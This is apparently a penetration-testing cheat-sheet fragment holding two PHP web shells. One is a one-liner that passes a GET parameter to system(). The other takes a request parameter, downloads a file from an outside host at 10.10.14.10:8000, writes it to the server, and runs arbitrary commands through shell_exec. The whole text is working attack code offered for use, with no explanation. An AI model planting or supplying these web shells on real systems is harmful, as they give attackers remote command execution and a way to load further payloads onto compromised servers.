## interactive mode
bash:# php -a 

# Basic Web Shell
<?php echo(system($_GET["cmd"])); ?>

# File Upload Web shell with command execution.

$phpCode = <<<'EOD'
<?php
    if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.14.10:8000/" . $_REQUEST['fupload']));
    };
    if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
    };
    ?>
EOD;